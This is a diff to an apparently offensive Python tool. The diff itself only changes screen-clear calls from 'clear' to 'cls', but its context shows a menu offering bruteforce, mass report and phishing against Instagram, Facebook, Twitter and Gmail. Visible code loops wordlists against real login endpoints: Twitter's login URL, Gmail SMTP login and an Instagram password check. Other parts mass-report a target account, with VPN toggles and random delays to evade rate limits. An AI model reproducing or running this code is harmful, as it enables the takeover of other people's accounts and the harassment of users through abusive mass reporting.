@@ -9,7 +9,7 @@ from bs4 import BeautifulSoup
 import instaloader
 import smtplib
 
-os.system("clear")
+os.system("cls")
 
 class color:
    PURPLE = '\033[95m'
@@ -70,7 +70,7 @@ def vpn_error():
   exit()
 
 def c_vpn():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(":: 0 vpn off | 1 vpn on ::", justify="center", style="#B0DAFF")
   try:
@@ -86,7 +86,7 @@ def c_vpn():
 
 
 def start_instagram():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(":: 1 bruteforce | 2 mass report | 3 phishing ::", justify="center", style="#B0DAFF")
   try:
@@ -100,25 +100,25 @@ def start_instagram():
 
   return choice
 def get_facebook():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(":: username ::", justify="center", style="#B0DAFF")
   uname = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉")
 def get_email():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(":: email ::", justify="center", style="#B0DAFF")
   uname = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉")
   return uname
 def get_username():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(":: username ::", justify="center", style="#B0DAFF")
   uname = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉@")
   return uname
 
 def get_wordlist():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(":: wordlist ::", justify="center", style="#B0DAFF")
   wordlist = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉")
@@ -140,12 +140,12 @@ def insta_bruteforce(username, wordlist, vpn):
   for line in wl_lines:
       password = line
       if insta_pass(username, line) == True:
-        os.system("clear")
+        os.system("cls")
         console.print(ascii_art, justify="center", style="#B0DAFF bold")
         console.print(password, justify="center", style="#13f41e bold")
         exit()
       elif insta_pass(username, line) == False:
-        os.system("clear")
+        os.system("cls")
         console.print(ascii_art, justify="center", style="#B0DAFF bold")
         console.print(line, justify="center", style="#ea0408 bold")
         c_spam = c_spam + 1
@@ -199,7 +199,7 @@ spam_message = '''
 '''
 
 def get_amount():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(":: amount ::", justify="center", style="#B0DAFF")
   try:
@@ -231,12 +231,12 @@ def insta_massreport(username, vpn, amount, spam_bool):
                datr = res.cookies.get_dict()["datr"]
           except:
                if random.choice(nu) == 2:
-                os.system("clear")
+                os.system("cls")
                 console.print(ascii_art, justify="center", style="#B0DAFF bold")
                 console.print("[ "+str(c_while)+" ]", justify="center", style="#f70202 bold")
                 c_while = c_while-2
                else:
-                os.system("clear")
+                os.system("cls")
                 console.print(ascii_art, justify="center", style="#B0DAFF bold")
                 console.print("[ "+str(c_while)+" ]", justify="center", style="#23f702 bold")
                 time.sleep(random.choice(nu))
@@ -292,30 +292,30 @@ If you'd like to contribute, please feel free to create a pull request. Thank yo
 
 
 def insta_phishing():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(phishing_help, justify="center", style="#B0DAFF")
   console.print(spam_phishing, justify="center", style="#f91713")
 
 def facebook_massreport():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(facebook_ju, justify="center", style="#B0DAFF")
 
 def twitter_massreport():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(twitter_ju, justify="center", style="#B0DAFF")
 
 
 def facebook_phishing():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
   console.print(spam_phishing, justify="center", style="#f91713")
 
 def twitter_phishing():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
   console.print(spam_phishing, justify="center", style="#f91713")
@@ -365,7 +365,7 @@ def facebook_bruteforce(username, wordlist, vpn):
     print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n"+color.END)
     exit() 
   for passw in wl_lines:
-    os.system("clear")
+    os.system("cls")
     console.print(ascii_art, justify="center", style="#B0DAFF bold")
     is_this_a_facebook_password(username, 10, passw)
     if vpn == True:
@@ -385,11 +385,11 @@ def twitter_bruteforce(username, wordlist, vpn):
      r = requests.post("https://twitter.com/login/", data=data)
 
      if ("success" in r.text):
-        os.system("clear")
+        os.system("cls")
         console.print(ascii_art, justify="center", style="#B0DAFF bold")
         print(color.GREEN+"Password finded: "+color.END+password)
      else:
-        os.system("clear")
+        os.system("cls")
         console.print(ascii_art, justify="center", style="#B0DAFF bold")
         console.print(password, justify="center", style="#ea0408 bold")
 
@@ -398,7 +398,7 @@ def twitter_bruteforce(username, wordlist, vpn):
      r = requests.post("https://twitter.com/settings/your_twitter_data", data=data)
 
      if ("success" in r.text):
-        os.system("clear")
+        os.system("cls")
         console.print(ascii_art, justify="center", style="#B0DAFF bold")
         console.print(password, justify="center", style="#13f41e bold")
         sys.exit(0)
@@ -421,13 +421,13 @@ def gmail_bruteforce(username, wordlist, vpn):
           session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
           session.starttls() #enable security
           session.login(username, password) #logi
-          os.system("clear")
+          os.system("cls")
           console.print(ascii_art, justify="center", style="#B0DAFF bold")
           console.print(password, justify="center", style="#13f41e bold")
           exit()
 
       except Exception:
-          os.system("clear")
+          os.system("cls")
           console.print(ascii_art, justify="center", style="#B0DAFF bold")
           console.print(password, justify="center", style="#ea0408 bold")
           if vpn == True:
@@ -435,13 +435,13 @@ def gmail_bruteforce(username, wordlist, vpn):
           time.sleep(random.choice(nu))
 
 def gmail_massreport():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(gmail_ju, justify="center", style="#B0DAFF")
 
 
 def gmail_phishing():
-  os.system("clear")
+  os.system("cls")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
   console.print(spam_phishing, justify="center", style="#f91713")
